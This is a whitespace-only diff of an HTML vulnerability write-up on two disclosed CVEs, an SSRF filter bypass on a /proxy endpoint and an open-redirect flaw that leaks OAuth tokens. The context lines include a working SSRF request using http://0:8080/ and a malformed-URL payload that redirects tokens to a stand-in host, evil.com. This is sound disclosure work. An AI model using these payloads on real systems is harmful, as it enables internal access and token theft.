@@ -108,7 +108,6 @@
 <span class="w">  </span><span class="nt">&lt;/servlet-mapping&gt;</span>
 </code></pre></div>
 
-
 <h2>SSRF on /proxy - CVE-2022-1713</h2>
 <p><code>src/main/java/ProxyServlet.java</code></p>
 <div class="codehilite"><pre><span></span><code><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span>
@@ -136,7 +135,6 @@
 
 <span class="w">            </span><span class="n">response</span><span class="p">.</span><span class="na">setHeader</span><span class="p">(</span><span class="s">&quot;Cache-Control&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;private, max-age=86400&quot;</span><span class="p">);</span>
 </code></pre></div>
-
 
 <p>It's pretty clear that the endpoint receives an <code>url</code> parameter and does some checking with <code>checkUrlParameter(urlParam)</code> to see if will allow a request to be made. Let's check the function.</p>
 <div class="codehilite"><pre><span></span><code><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkUrlParameter</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span>
@@ -190,7 +188,6 @@
 <span class="w"> </span><span class="p">}</span>
 </code></pre></div>
 
-
 <p>The function does a series of checking to assure that the url is not internal, and of course this has a LOT of bypasses. I went with the simple <code>http://0:8080/</code> , see more at https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</p>
 <div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/proxy?url=http%3a//0:8080/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1:8080</span>
@@ -207,7 +204,6 @@
 <span class="na">Accept-Language</span><span class="o">:</span> <span class="l">pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7</span>
 <span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
 </code></pre></div>
-
 
 <p>Not much to add here, just a simple SSRF bypass.</p>
 <h2>Leakage of third-party OAuth token - CVE-2022-1774</h2>
@@ -264,7 +260,6 @@ So let's check how the URL from <code>redirect</code> is checked.</p>
 <span class="p">}</span>
 </code></pre></div>
 
-
 <p>The <code>isAbsolute</code> function receives a <code>url</code> and first checks if it starts with <code>//</code> because that will translate to <code>http://whatever</code>, let's check some examples from the <a href="https://www.rfc-editor.org/rfc/rfc3986">RFC 3986</a> for the URI syntax :</p>
 <div class="codehilite"><pre><span></span><code><span class="s2">&quot;g:h&quot;</span><span class="w">           </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;g:h&quot;</span>
 <span class="s2">&quot;g&quot;</span><span class="w">             </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/b/c/g&quot;</span>
@@ -291,7 +286,6 @@ So let's check how the URL from <code>redirect</code> is checked.</p>
 <span class="s2">&quot;../../g&quot;</span><span class="w">       </span><span class="o">=</span><span class="w">  </span><span class="s2">&quot;http://a/g&quot;</span>
 </code></pre></div>
 
-
 <p>If it starts with only a <code>/</code> is not an absolute URL, and then it passes the <code>url</code> to the <code>URI</code> class. The catch here is that if <code>URISyntaxException</code> is raised the function will return <code>false</code>, telling that the URL is not absolute and then redirecting the user. At first glance this looks okay, because if an URL is not valid why would the redirect work, right ? Wrong! This only works if the client actually doing the redirect, the browser in this case, complies with the RFC and Chrome does NOT, wtf. Now we need to find an absolute URL that is not valid but that Chrome accepts on the <code>Location</code> header.</p>
 <p>I did some fuzzing and some manual testing and ended up with <code>https:// @evil.com/</code>, note the space. This is not a valid URL by the RFC: </p>
 <div class="codehilite"><pre><span></span><code><span class="n">unreserved</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">ALPHA</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">DIGIT</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;-&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;.&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;_&quot;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;~&quot;</span>
@@ -301,7 +295,6 @@ So let's check how the URL from <code>redirect</code> is checked.</p>
 <span class="n">userinfo</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="w"> </span><span class="n">unreserved</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">pct</span><span class="o">-</span><span class="n">encoded</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">sub</span><span class="o">-</span><span class="n">delims</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="p">)</span>
 <span class="n">authority</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="n">userinfo</span><span class="w"> </span><span class="s">&quot;@&quot;</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s">&quot;:&quot;</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="p">]</span>
 </code></pre></div>
-
 
 <p>No whitespace in the <code>userinfo</code>. This will end up on the <code>catch</code> statement, bypassing the check and redirecting the user to <code>evil.com</code>, leaking the <code>access_token</code>.</p>
 <div class="codehilite"><pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span> <span class="m">302</span> <span class="ne">Found</span>
@@ -318,7 +311,6 @@ So let's check how the URL from <code>redirect</code> is checked.</p>
 <span class="na">Server</span><span class="o">:</span> <span class="l">cloudflare</span>
 <span class="na">Cf-Ray</span><span class="o">:</span> <span class="l">70b0c6119831273d-FOR</span>
 </code></pre></div>
-
 
 <p>The steps of the attack are:</p>
 <ol>
